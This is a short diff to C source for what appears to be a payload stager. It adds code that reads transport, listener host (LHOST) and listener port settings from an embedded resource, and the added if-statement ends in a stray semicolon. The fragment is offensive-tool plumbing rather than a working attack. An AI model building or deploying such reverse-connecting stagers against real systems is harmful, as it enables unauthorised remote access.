@@ -70,7 +70,9 @@ int wmain(int argc, wchar_t *argv[])
 	char url[512] = {0};	//Full URL, 512 bytes are enough. 
 	/*************
 	Program Start
-	*************/
+	**************/
+	if(GetOptionsFromResource(payload_settings.TRANSPORT,payload_settings.LHOST,payload_settings.LPORT));
+	
 	print_header();								// as it sounds...
 	// Parse command line arguments, Fill the PAYLOAD_SETTINGS struct et'all... idea from "http://www.cplusplus.com/forum/articles/13355/"
 	for (int i = 1; i < argc; i++) 
